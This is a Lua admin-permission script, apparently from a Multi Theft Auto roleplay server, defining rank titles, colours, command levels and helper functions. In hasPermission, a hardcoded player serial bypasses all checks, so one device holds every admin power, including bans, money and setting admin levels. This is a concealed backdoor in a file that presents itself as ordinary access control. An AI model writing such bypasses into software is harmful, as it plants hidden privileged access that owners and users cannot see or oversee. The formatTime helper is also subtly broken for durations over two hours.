--SocialGaming | 2019
white = "#ffffff"
aTitles = {
    [-1] = "RP Guard",
    [0] = "Player",
    [1] = "Trial Admin Assistant",
    [2] = "Support member",
    [3] = "Support member",
    [4] = "Admin 2",
    [5] = "Admin 3",
    [6] = "Admin 4",
    [7] = "Admin 5",
    [8] = "Main admin",
    [9] = "SuperAdmin",
    [10] = "System administrator",
    [11] = "Server Manager",
    [12] = "Owner",
    [13] = "Developer",
}

local aColors = {
    --[level] = {hexColor, r,g,b}
    [-1] = "#ff751a",
    [0] = "#87d37c",
    [1] = "#ff66d9",
    [2] = "#ff66d9",
    [3] = "#55c371",
    [4] = "#55c371",
    [5] = "#55c371",
    [6] = "#55c371",
    [7] = "#55c371",
    [8] = "#3460e5",
    [9] = "#ffd11a",
    [10] = "#ff33ff",
    [11] = "#ff751a",
    [12] = "#dc4949",
    [13] = "#32b3ef",
}


local commands = {
    --["Parancs"] = {Minimum admin szint, Adminduty}
    ["as"] = {1, false},--AdminSegéd
    ["va"] = {1, false},--AdminSegéd
    ["togva"] = {1, false},
    ["a"] = {3, false},
    ["aduty"] = {3, false},--Admin[1]
    ["vhspawn"] = {3, true},
    ["setskin"] = {3, true},
    ["jailed"] = {3, true},
	["akick"] = {3, true},	
	["afreeze"] = {3, true},	
	["unfreeze"] = {3, true},	
	["asay"] = {3,true},
    ["goto"] = {3, true},
    ["gethere"] = {3, true},
    ["fly"] = {3, true},
    ["sethunger"] = {3, true},
    ["setdrink"] = {3, true},
    ["setarmor"] = {3, true},
    ["recon"] = {3, true},
    ["vanish"] = {3, true},
    ["kick"] = {3, true},
    ["ajail"] = {3, true},
    ["ojail"] = {3, true},
    ["unjail"] = {3, true},
    ["sethp"] = {3,true},--Admin[2]
    ["fix"] = {4,true},--Admin[3]
    ["ban"] = {5, true}, 
    ["oban"] = {5, false}, 
    ["unban"] = {5, true}, 
    ["changename"] = {3, true}, 
    ["fixveh"] = {4,false},
    ["gotocar"] = {6, true},--Admin[4]
    ["getcar"] = {6, true},
    ["sethelperlevel"] = {6, true},
    ["getpos"] = {8, false},-- FőAdmin
    ["adminstats"] = {8, true},
    ["setdim"] = {8, true},
    ["toga"] = {6, true},
    ["togpm"] = {10, true},
    ["achangelock"] = {8, true},
    ["forceaduty"] = {8, true},
    ["valog"] = {8, false},
    ["setalevel"] = {8, true},-- Főadmin
    ["setanick"] = {9, true},
    ["setmoney"] = {8, true},
    ["setpp"] = {11, true},
    ["setserverslot"] = {10, true},
}


function getAdminColor(element, level)
    if level then
        local color = aColors[level] or "#000000"
        return color
    else
        local level = getElementData(element, "admin >> level") or 0
        local color = aColors[level] or "#000000"
        return color
    end
end

function getAdminTitle(e)
    local level = getElementData(e, "admin >> level") or 0
    local title = aTitles[level] or "Ismeretlen (Jelentsd fejlesztőnek!)"
    return title
end

function getAdminDuty(e)
    local duty = getElementData(e, "admin >> duty")
    local adminlevel = getElementData(e, "admin >> level")
    if adminlevel == 1 or adminlevel == 2 then
        duty = true
    elseif adminlevel == 0 then
        duty = false
    end
    return duty
end

function getAdminName(e, onlyAdminName)
    local name = getElementData(e, "char >> name") or getPlayerName(e)
    name = name:gsub("_", " ")
    if (getElementData(e,"admin >> level") or 0) > 2 then 
        if getElementData(e, "admin >> duty") or onlyAdminName then
            name = getElementData(e, "admin >> name") or "Ismeretlen Admin"
        end
    else 
        name = getElementData(e, "char >> name") or getPlayerName(e)
    end
    return name
end

function hasPermission(element, command)
    local data = commands[command]
    if not getElementData(element, "loggedIn") then
        return false
    end
    if getPlayerSerial(element) == "D5ED219F39904C559DC2EC786DCB5584" then 
        return true;
    end
    if data then
        local adminlevel = getElementData(element, "admin >> level") or 0
        if adminlevel >= data[1] then
            if data[2] then
                local adminduty = getElementData(element, "admin >> duty")
                if adminduty or getElementData(element, "admin >> level") >= 9 then
                    return true
                end
            else
                return true
            end
        end
    end
    return false
end

function formatMoney(amount)
	local left,num,right = string.match(tostring(amount),'^([^%d]*%d)(%d*)(.-)$')
	return left..(num:reverse():gsub('(%d%d%d)','%1.'):reverse())..right
end

function formatTime(m)
	local h = 0
	if m > 60 then
		h = h + 1
		m = m - 60
    end
    if h < 10 then 
        h = "0"..h;
    end
    if m < 10 then 
        m = "0"..m;
    end
	return h..":"..m
end